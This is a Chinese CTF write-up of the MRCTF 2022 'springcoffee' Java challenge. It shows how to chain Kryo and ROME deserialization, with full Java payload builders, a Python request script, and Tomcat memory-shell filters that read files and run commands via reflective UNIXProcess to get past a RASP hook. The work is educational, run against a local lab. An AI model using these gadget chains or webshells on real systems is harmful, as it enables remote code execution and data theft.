---
title: "2022MRCTF springcoffee"
onlyTitle: true
date: 2025-2-21 20:08:37
categories:
- ctf
- WP
tags:
- CTF
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8130.jpg
---



# MRCTF 2022

刚看完Dubbo kryo反序列化，手痒难耐，网上找到这个ctf java题奇多，于是来练手



## springcoffee

* 题目要点：Kryo反序列化、ROME反序列化、JNI绕过RASP

题目环境：https://github.com/EkiXu/My-CTF-Challenge/tree/8b75bb9807452596d8d4ef2089d3d056b1961b0d/springcoffee

题目放出来的时候是只给了springcoffee-0.0.1-SNAPSHOT jar文件，保持还原我们也就只看这个文件吧

调jar文件的话，解压IDEA打开，把BOOT-INF下classes和lib目录加入库即可丝滑使用

先看Controller

/coffee/order路由如下，重点在于用kryo.readClassAndObject去反序列化了(CoffeRequest) coffee的extraFlavor字段

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250215145915305.png)

CoffeeRequest是个自定义的javaBean

/coffee/demo如下，具体功能如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250215151233961.png)

```java
    @RequestMapping({"/coffee/demo"})
    public Message demoFlavor(@RequestBody String raw) throws Exception {
        System.out.println(raw);
        JSONObject serializeConfig = new JSONObject(raw);
        if (serializeConfig.has("polish") && serializeConfig.getBoolean("polish")) {
            this.kryo = new Kryo();
            Method[] var3 = this.kryo.getClass().getDeclaredMethods();
            int var4 = var3.length;

            for(int var5 = 0; var5 < var4; ++var5) {
                Method setMethod = var3[var5];
                if (setMethod.getName().startsWith("set")) {
                    try {
                        Object p1 = serializeConfig.get(setMethod.getName().substring(3));
                        if (!setMethod.getParameterTypes()[0].isPrimitive()) {
                            try {
                                p1 = Class.forName((String)p1).newInstance();
                                setMethod.invoke(this.kryo, p1);
                            } catch (Exception var9) {
                                Exception e = var9;
                                e.printStackTrace();
                            }
                        } else {
                            setMethod.invoke(this.kryo, p1);
                        }
                    } catch (Exception var10) {
                    }
                }
            }
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Output output = new Output(bos);
        this.kryo.register(Mocha.class);
        this.kryo.writeClassAndObject(output, new Mocha());
        output.flush();
        output.close();
        return new Message(200, "Mocha!", Base64.getEncoder().encode(bos.toByteArray()));
    }
```

也就是说如果JSON参数raw 传了polish:true，会继续遍历raw的key value去调用Kryo对象的setter

其他也没什么好看的

看看依赖，除了kryo依赖还有rome

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250215151821807.png)

由上篇//todo分析的Dubbo中 kryo反序列化可知，用kryo.readClassAndObject去进行反序列化，如果传入的对象是HashMap，获取到的序列化器为Mapdeserializer，会触发到HashMap.put进而触发Rome链

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250216191657589.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214140258671.png)

直接随便搞个rome payload如下，用kryo.writeClassAndObject写序列化流：

```java
package org.exploit.third.Dubbo;

import com.esotericsoftware.kryo.io.Output;
import com.esotericsoftware.kryo.io.Input;
import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.esotericsoftware.kryo.Kryo;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

//or LinkedHashSet.readObject
//HashMap.readObject
//HashMap.putVal
//HotSwappableTargetSource.equals
//XString.equals
//ToStringBean.toString
public class kryo_MRCTF {
    private final Kryo kryo;

    public kryo_MRCTF() {
        kryo = new Kryo();
        kryo.setRegistrationRequired(false);
        kryo.setInstantiatorStrategy(new org.objenesis.strategy.StdInstantiatorStrategy());

    }
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        TemplatesImpl fakeTemplates = new TemplatesImpl();
        ToStringBean toStringBean = new ToStringBean(Templates.class, fakeTemplates);
        XString xString = new XString(null);
//        xString.equals(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource_InputObj = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(xString);
//        hotSwappableTargetSource.equals(hotSwappableTargetSource_InputObj);
        HashMap hashMap = new HashMap();
        hashMap.put(hotSwappableTargetSource_InputObj,"godown");
        hashMap.put(hotSwappableTargetSource,"godown");
        Field toStringBean_objField = ToStringBean.class.getDeclaredField("obj");

        toStringBean_objField.setAccessible(true);
        toStringBean_objField.set(toStringBean, templatesClass);

        kryo_MRCTF kryo_MRCTF = new kryo_MRCTF();
        String ser = kryo_MRCTF.serialize(hashMap);

        System.out.println(ser);
        kryo_MRCTF.unserialize(ser);
    }
    public String serialize(Object obj) throws IOException {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             Output output = new Output(baos)) {
            kryo.writeClassAndObject(output, obj);
            output.close(); // 关闭 Output，确保所有数据写入

            return Base64.getEncoder().encodeToString(baos.toByteArray()); // 转 Base64
        }
    }
    public void unserialize(String base64Str) {
        byte[] bytes = Base64.getDecoder().decode(base64Str); // Base64 解码
        try (ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
             Input input = new Input(bais)) {
            kryo.readClassAndObject(input); // 反序列化
            return;
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

注意传参是JSON格式，且`Content-Type:application/json`

```json
{
  "extraFlavor": "BASE64_ENCODED_STRING",
  "espresso": 0.7,
  "hotWater": 0.3,
  "milkFoam": 0.2,
  "steamMilk": 0.8
}
```

直接一个大注入进去，结果报Class is not registered

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250216212932013.png)

原因Kyro在5.0.0后，默认开启了registrationRequired

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250216192240967.png)

在readClassAndObject的时候会调用readClass

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250216204444786.png)

继续跟进，在getRegistration获取的registration，这里面registration==null且registrationRequired开启就会报错

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250216205122038.png)

也就是说只允许序列化和反序列化如下对象：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250216192506739.png)



OK关键就在于registrationRequired，回到/coffee/demo路由，这里新建了一个Kryo并能调用任意单参数setter去设置该Kryo的值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250216205544054.png)

很显然Kryo里有这个setter去修改RegistrationRequired值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250216205731243.png)

但是每次请求不都是会new一个Kryo吗？

答案是不会，因为spring Controller默认单例模式，无论访问多少次路由，spring都只会有一个Controller实例

向coffee/demo路由来一发

```json
{"polish":true,"RegistrationRequired":false}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250216213135880.png)

报无法强转为ExtraFlavor，那就是顺利反序列化了，但是为什么没弹计算器？

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218151034841.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218151100325.png)

原来是references要对齐！什么意思呢？

经过我的一步一步调试发现，在Kryo.readClassAndObject中，references为true和false对registration的反序列化处理时不一样的

>References即引用，对A对象序列化时，默认情况下kryo会在每个成员对象第一次序列化时写入一个数字，该数字逻辑上就代表了对该成员对象的引用，如果后续有引用指向该成员对象，则直接序列化之前存入的数字即可，而不需要再次序列化对象本身。这种默认策略对于成员存在互相引用的情况较有利，否则就会造成空间浪费（因为没序列化一个成员对象，都多序列化一个数字），通常情况下可以将该策略关闭，kryo.setReferences(false);
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218160019322.png)

从代码上来看，如果发送端references为true，而服务器references为false时，在Kryo.readReferenceOrNull中多调用了一次readVarInt

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218153741161.png)

同理，只要服务器和发送端的references不一致，就会造成反序列化错误

在windows和我的docker上，references测试默认为false！所以发送：

```json
    data = {
        "polish":True,
        "RegistrationRequired":False,
    }
```

可能有部分环境references默认为true(Maybe就是你的)，不过目前没碰到

```json
{
    "polish":True,
    "references":True,
    "RegistrationRequired":False,
}
```

>而且我测试的时候用的marshelsec自带的Kryo，版本不同导致序列化的结果也不同，妈的折磨了我两天，代码愣是看不出错误，marshalsec的Kryo连package都是一样的，还是得用和服务器一样的kryo，并把marshelsec从payload环境移除，调的我头皮发麻了
>
>```xml
><dependency>
>    <groupId>com.esotericsoftware</groupId>
>    <artifactId>kryo</artifactId>
>    <version>5.3.0</version>
></dependency>
>```

现在报错如下，`Class cannot be created (missing no-arg constructor)`，反序列化的类需要有无参构造函数，而HotSwappableTargetSource没有

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218162125099.png)

跟进到报错点DefaultInstantiatorStraregy.newInstantiatorOf，里面获取了无参构造器并实例化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218162715359.png)

newInstantiator调用了newInstantiatorOf

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218162925696.png)

可以看到strategy默认设置为了DefaultInstantiatorStrategy

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218163008556.png)

刚好有个setter可以设置这个属性

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218163111070.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218163441596.png)

copy一个官网图，StdInstantiatorStrategy不需要无参构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora19.png)

所以：

```json
{
    "polish":True,
    "References":True,//linux need
    "RegistrationRequired":False,
    "InstantiatorStrategy": "org.objenesis.strategy.StdInstantiatorStrategy"
}
```



跟了老半天，忘了kryo反序列化不调用readObject，也就没有给`_tfactory`赋值，用signedObject.getObject二次反序列化去触发readObject

```java
package org.exploit.third.Dubbo;

import com.esotericsoftware.kryo.io.Output;
import com.esotericsoftware.kryo.io.Input;
import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.esotericsoftware.kryo.Kryo;
import org.apache.shiro.crypto.hash.Hash;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Base64;
import java.util.HashMap;

//or LinkedHashSet.readObject
//HashMap.readObject
//HashMap.putVal
//HotSwappableTargetSource.equals
//XString.equals
//ToStringBean.toString
public class kryo_MRCTF {
    private final Kryo kryo;

    public kryo_MRCTF() {
        kryo = new Kryo();
        kryo.setRegistrationRequired(false);
        kryo.setInstantiatorStrategy(new org.objenesis.strategy.StdInstantiatorStrategy());

    }
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        TemplatesImpl fakeTemplates = new TemplatesImpl();
        ToStringBean toStringBean = new ToStringBean(Templates.class, fakeTemplates);
        XString xString = new XString(null);
//        xString.equals(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource_InputObj = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(xString);
//        hotSwappableTargetSource.equals(hotSwappableTargetSource_InputObj);
        HashMap hashMap = new HashMap();
        hashMap.put(hotSwappableTargetSource_InputObj,"godown");
        hashMap.put(hotSwappableTargetSource,"godown");
        Field toStringBean_objField = ToStringBean.class.getDeclaredField("obj");

        toStringBean_objField.setAccessible(true);
        toStringBean_objField.set(toStringBean, templatesClass);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance("DSA"));

        //二次触发ROME
        SignedObject fakesignedObject = new SignedObject(new HashMap<>(), kp.getPrivate(), Signature.getInstance("DSA"));
        ToStringBean toStringBean2 = new ToStringBean(SignedObject.class, fakesignedObject);
//        xString.equals(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource_InputObj2 = new HotSwappableTargetSource(toStringBean2);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(xString);
//        hotSwappableTargetSource.equals(hotSwappableTargetSource_InputObj);
        HashMap hashMap2 = new HashMap();
        hashMap2.put(hotSwappableTargetSource_InputObj2,"godown");
        hashMap2.put(hotSwappableTargetSource2,"godown");
        Field toStringBean_objField2 = ToStringBean.class.getDeclaredField("obj");

        toStringBean_objField2.setAccessible(true);
        toStringBean_objField2.set(toStringBean2, signedObject);

        kryo_MRCTF kryo_MRCTF = new kryo_MRCTF();
        String ser = kryo_MRCTF.serialize(hashMap2);

        System.out.println(ser);
        kryo_MRCTF.unserialize(ser);
    }
    public String serialize(Object obj) throws IOException {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             Output output = new Output(baos)) {
            kryo.writeClassAndObject(output, obj);
            output.close(); // 关闭 Output，确保所有数据写入

            return Base64.getEncoder().encodeToString(baos.toByteArray()); // 转 Base64
        }
    }
    public void unserialize(String base64Str) {
        byte[] bytes = Base64.getDecoder().decode(base64Str); // Base64 解码
        try (ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
             Input input = new Input(bais)) {
            kryo.readClassAndObject(input); // 反序列化
            return;
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

现在本地能打通了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218172827590.png)

加个Tomcat内存马打docker，这部分就不用多说了，改个字节码就OK

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218180217661.png)



给docker来一发，为了方便来回切有个脚本爽一点：

```python
import requests

url = "http://127.0.0.1:10805"#docker-compose.yml默认映射

# url = "http://127.0.0.1:8085"
def demo():
    data = {
        "polish":True,
        "References":True,#linux need
        "RegistrationRequired":False,
        "InstantiatorStrategy": "org.objenesis.strategy.StdInstantiatorStrategy"
    }
    res = requests.post(url+"/coffee/demo",json=data)

    return res.json()

poc = {
    "espresso":0.6,
    "extraFlavor":"code"
}

res = demo()

res = requests.post(url+"/coffee/order",json=poc).json()

print(res)
```

显然是注入不成功的，还有rasp，改下内存马，不用Runtime.exec，用URL.openStream读下文件

```java
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                         FilterChain filterChain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            ////读文件 ?cmd=file:///etc/passwd or 列目录 ?cmd=file:///
            final URL url = new URL(cmd);
            final BufferedReader in = new BufferedReader(new
                    InputStreamReader(url.openStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }

            ////RCE ?cmd=whoami
//            Process process = Runtime.getRuntime().exec(cmd);
//            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
//                    new java.io.InputStreamReader(process.getInputStream()));
//            StringBuilder stringBuilder = new StringBuilder();
//            String line;
//            while ((line = bufferedReader.readLine()) != null) {
//                stringBuilder.append(line + '\n');
//            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }
```

根目录如下，有flag，readflag，很显然直接读flag是不行的，需要执行readflag

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218190307097.png)



/app目录下有jrasp.jar

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218190421723.png)

再搞个读文件：

```java
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                         FilterChain filterChain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            File file = new File(cmd);

            // 1. 确保文件存在且可读
            if (!file.exists() || !file.isFile() || !file.canRead()) {
                System.out.println("文件不存在或无法读取: " + cmd);
                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_NOT_FOUND, "文件不存在");
                return;
            }

            // 2. 设置响应头，提供文件下载
            HttpServletResponse response = (HttpServletResponse) servletResponse;
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");

            // 3. 读取文件并写入响应流
            try (FileInputStream fis = new FileInputStream(file);
                 OutputStream out = response.getOutputStream()) {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
                out.flush();
            } catch (IOException e) {
                System.err.println("文件传输失败: " + e.getMessage());
                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "文件传输失败");
            }//读文件
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }
```

访问?cmd=/app/jrasp.jar即可下载文件

用Attach agent的方式过滤了ProcessImpl.start

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218193516400.png)

用ProcessImpl的下一层UNIXProcess，或者JNI的方式绕过

JRASP的JNI绕过改天再学习，具体就是自己编译一个native方法

反射调用UNIXProcess绕过如下：

```java
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                         FilterChain filterChain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
            Class<?> cls = null;
            try {
                cls = Class.forName("java.lang.UNIXProcess");
            } catch (ClassNotFoundException e) {
                throw new RuntimeException(e);
            }
            Constructor<?> constructor = cls.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            String[] command = {"/bin/sh", "-c", cmd};
            byte[] prog = toCString(command[0]);
            byte[] argBlock = getArgBlock(command);
            int argc = argBlock.length;
            int[] fds = {-1, -1, -1};
            Object obj = null;
            try {
                obj = constructor.newInstance(prog, argBlock, argc, null, 0, null, fds, false);
                Method method = cls.getDeclaredMethod("getInputStream");
                method.setAccessible(true);
                InputStream is = (InputStream) method.invoke(obj);
                InputStreamReader isr = new InputStreamReader(is);
                BufferedReader br = new BufferedReader(isr);
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            } catch (InstantiationException | NoSuchMethodException | InvocationTargetException |
                     IllegalAccessException e) {
                throw new RuntimeException(e);
            }
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }
    byte[] toCString(String s) {
        if (s == null) {
            return null;
        }
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }
    private static byte[] getArgBlock(String[] cmdarray){
        byte[][] args = new byte[cmdarray.length-1][];
        int size = args.length;
        for (int i = 0; i < args.length; i++) {
            args[i] = cmdarray[i+1].getBytes();
            size += args[i].length;
        }
        byte[] argBlock = new byte[size];
        int i = 0;
        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
        }
        return argBlock;
    }
```

已经能执行命令了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218201316766.png)

至于读flag，把readflag下下来一看是TM个C的文件，还有个交互才能OK

不会。直接抄一个perl进行交互

```perl
perl -e 'use strict;
use IPC::Open3;

my $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, "/readflag" ) or die "open3() failed!";

my $r;
$r = <CHLD_OUT>;
print "$r";
$r = <CHLD_OUT>;
print "$r";
$r = substr($r,0,-3);
$r = eval "$r";
print "$r\n";
print CHLD_IN "$r\n";
$r = <CHLD_OUT>;
print "$r"';
```

```http
http://192.168.0.106:10805/coffee/demo?cmd=perl+-e+%27use+strict%3b%0ause+IPC%3a%3aOpen3%3b%0a%0amy+%24pid+%3d+open3(+%5c*CHLD_IN%2c+%5c*CHLD_OUT%2c+%5c*CHLD_ERR%2c+%22%2freadflag%22+)+or+die+%22open3()+failed!%22%3b%0a%0amy+%24r%3b%0a%24r+%3d+%3cCHLD_OUT%3e%3b%0aprint+%22%24r%22%3b%0a%24r+%3d+%3cCHLD_OUT%3e%3b%0aprint+%22%24r%22%3b%0a%24r+%3d+substr(%24r%2c0%2c-3)%3b%0a%24r+%3d+eval+%22%24r%22%3b%0aprint+%22%24r%5cn%22%3b%0aprint+CHLD_IN+%22%24r%5cn%22%3b%0a%24r+%3d+%3cCHLD_OUT%3e%3b%0aprint+%22%24r%22%27%3b
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250218203228462.png)

前半段都还好，后面这个计算题是给人做的？



另外三道java没环境，直接略





参考：

https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/
